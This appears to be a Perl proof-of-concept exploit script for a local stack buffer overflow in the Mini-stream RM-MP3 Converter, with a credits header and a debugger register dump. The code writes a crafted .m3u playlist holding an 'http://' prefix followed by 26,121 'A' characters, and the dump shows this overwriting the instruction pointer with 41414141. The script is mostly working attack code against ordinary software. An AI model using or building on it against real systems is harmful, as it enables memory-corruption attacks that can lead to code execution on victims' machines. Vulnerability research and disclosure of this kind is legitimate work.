#!/usr/bin/perl
#
#
# ************************************************************************
# *  Mini-stream RM-MP3 Converter (.M3U File) Local Stack Overflow POC   *
# ************************************************************************
#
# Found By : Cyber-Zone (ABDELKHALEK)
# E-mail   : Paradis_des_fous@hotmail.fr
# Home     : WwW.IQ-TY.CoM ; WwW.No-Exploit.CoM
# Greetz   : Hussin X , Jiko (my brother), ZoRLu , Nabilx , Mag!c ompo , Stack ... all mgharba HaCkers and Sec-r1z.com
#
# Download product : http://www.rm-to-mp3.net/downloads/Mini-streamRM-MP3Converter.exe
#
#
# Olly registers
#EAX 00000001
#ECX 41414141
#EDX 00D20000
#EBX 00333ED8 ASCII "C:\Documents and Settings\Administrateur\Bureau\KHAL.m3u"
#ESP 000F6C90
#EBP 000FBFB4
#ESI 77C2FCE0 msvcrt.77C2FCE0
#EDI 00006619
#EIP 41414141
#
my $Header = "#EXTM3U\n";

my $ex="http://"."A" x 26121;# just Poc tested under MS windows SP2 Fr

open(MYFILE,'>>KHAL.m3u');

print MYFILE $Header.$ex;

close(MYFILE);
